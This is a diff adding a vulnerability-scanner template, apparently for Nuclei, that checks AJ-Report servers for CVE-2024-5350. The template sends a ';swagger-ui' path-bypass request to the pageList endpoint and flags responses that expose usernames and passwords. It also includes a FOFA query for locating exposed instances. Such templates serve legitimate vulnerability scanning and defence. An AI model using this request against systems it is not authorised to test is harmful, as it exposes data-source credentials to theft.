@@ -1,0 +1,31 @@
+id: aj-report-pagelist-info-leak
+
+info:
+  name: "AJ-Report pageList 接口敏感数据泄露漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="AJ-Report"
+  reference:
+  - CVE-2024-5350
+  tags: AJ-Report
+
+http:
+- raw:
+  - |
+    GET /;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'username'
+  - type: word
+    part: body
+    words:
+    - 'password'
